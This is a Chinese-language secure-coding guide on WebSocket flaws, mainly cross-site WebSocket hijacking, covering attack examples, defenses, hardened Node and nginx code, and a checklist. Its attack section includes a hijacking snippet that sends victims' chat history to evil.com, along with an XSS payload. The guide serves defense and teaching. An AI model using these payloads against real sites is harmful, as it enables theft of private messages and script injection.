# WebSocket 安全缺陷 (WebSocket Security)

> 分类：协议 / 实时通信 | 风险：中高 | CWE-1385

## 1. 攻击原理

WebSocket 建立后是**长连接双向通道**，不受同源策略与 CORS 预检限制，很多在 HTTP 上生效的防护在 WS 上失效：

| 缺陷 | 说明 |
|---|---|
| 不校验 Origin | 任意站点可发起跨站 WebSocket 劫持（CSWSH） |
| 建连时不鉴权 | 仅依赖 Cookie，握手无 Token 校验 |
| 消息无授权 | 连上后可订阅/操作任意频道或用户 |
| 消息未校验 | 反序列化、SQL 注入、XSS 经 WS 传入 |
| 无频率限制 | 消息洪泛打满服务端 |
| 明文传输 | `ws://` 而非 `wss://` |
| 连接不过期 | 断线重连无 Token 刷新，泄露后长期可用 |
| 日志缺失 | WS 消息不记录，攻击难以发现 |

## 2. 攻击示例

### 跨站 WebSocket 劫持（CSWSH）

```js
// 攻击者页面
const ws = new WebSocket('wss://chat.site.com/ws');
ws.onopen = () => ws.send(JSON.stringify({ action: 'getHistory', room: 'private' }));
ws.onmessage = (e) => fetch('https://evil.com/collect', { method: 'POST', body: e.data });
```

浏览器会带上 `site.com` 的 Cookie。若服务端不校验 `Origin`，攻击者即可读取受害者聊天记录。

### 消息级越权

```json
{ "action": "subscribe", "channel": "user:1002" }
```

服务端不校验订阅者是否为 1002 → 监听他人消息。

### 消息注入

```json
{ "action": "send", "text": "<img src=x onerror=alert(1)>" }
```

前端渲染不转义 → 存储型 XSS。

### 洪泛

单连接每秒发送 10 万条消息，广播给房间内所有用户 → 服务端与客户端双崩。

## 3. 影响

- 实时数据泄露（聊天、行情、协作内容）
- 以受害者身份执行操作
- XSS / 注入经 WS 绕过 WAF
- 服务端资源耗尽

## 4. 防御措施

1. **握手阶段鉴权**：校验 `Origin` 白名单 + Token（`Sec-WebSocket-Protocol` 或首条消息认证），不单靠 Cookie。
2. **Origin 严格校验**：比对完整 origin，非白名单直接拒绝握手（403）。
3. **每条消息都做授权**：订阅/发送/操作都要校验资源归属，不能只在连接时验一次。
4. **消息 schema 校验**：类型、长度、字段白名单；反序列化安全（见 12）；渲染转义（见 03）。
5. **频率与配额**：每连接、每用户消息速率限制；单条消息大小上限；连接数上限。
6. **强制 `wss://`**：TLS 加密；HSTS 覆盖。
7. **会话有效期**：连接最大存活时间（如 30 分钟）+ Token 过期后要求重新认证（发送 `reauth` 指令）。
8. **心跳与异常断开**：检测僵尸连接，防止资源堆积。
9. **最小数据推送**：按订阅精确推送，不广播全量。
10. **日志与审计**：记录连接、订阅、关键操作；异常模式告警。

## 5. 代码对比

```js
// ✅ Node（ws）+ 握手鉴权
import { WebSocketServer } from 'ws';
import { URL } from 'url';

const ALLOWED_ORIGINS = new Set(['https://app.site.com']);

const wss = new WebSocketServer({
  noServer: true,
  maxPayload: 64 * 1024,          // 单条消息上限
});

server.on('upgrade', async (req, socket, head) => {
  const origin = req.headers.origin;
  if (!ALLOWED_ORIGINS.has(origin)) return socket.destroy();   // 拒绝 CSWSH

  const { searchParams } = new URL(req.url, 'https://app.site.com');
  const token = searchParams.get('token');
  const user = await verifyJwt(token);                          // 握手鉴权
  if (!user) return socket.destroy();

  wss.handleUpgrade(req, socket, head, (ws) => {
    ws.user = user;
    ws.isAlive = true;
    wss.emit('connection', ws, req);
  });
});

wss.on('connection', (ws) => {
  const bucket = new RateLimiter({ points: 30, duration: 1000 });

  ws.on('message', async (raw) => {
    if (!bucket.tryConsume(1)) return ws.close(1008, 'rate limited');

    let msg;
    try { msg = JSON.parse(raw); } catch { return ws.close(1003, 'bad json'); }
    if (!Schema.safeParse(msg).success) return ws.close(1008, 'bad message');

    if (msg.action === 'subscribe') {
      if (msg.channel !== `user:${ws.user.id}` && !ws.user.isAdmin) {
        return ws.send(JSON.stringify({ error: 'forbidden' }));  // 每条消息授权
      }
      subscribe(ws, msg.channel);
    }
  });

  const timer = setInterval(() => {
    if (!ws.isAlive) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  }, 30000);

  ws.on('pong', () => { ws.isAlive = true; });
  ws.on('close', () => clearInterval(timer));
});
```

```nginx
# ✅ 只允许同源 + wss
location /ws {
    proxy_pass http://app;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_read_timeout 60s;
    # Origin 校验在应用层，网关可作为兜底
}
```

## 6. 自查清单

- [ ] 握手校验 Origin 白名单
- [ ] 握手时校验 Token，不仅依赖 Cookie
- [ ] 每条消息做资源级授权
- [ ] 消息 schema 校验，大小限制
- [ ] 每连接/每用户限流
- [ ] 强制 `wss://`，HSTS 覆盖
- [ ] 连接有最大存活时间与重认证
- [ ] 心跳与僵尸连接清理
- [ ] 关键操作有日志与告警

## 7. 参考资料

- OWASP: WebSocket Security Cheat Sheet
- CWE-1385: Missing Origin Validation in WebSockets
- PortSwigger: WebSocket attacks
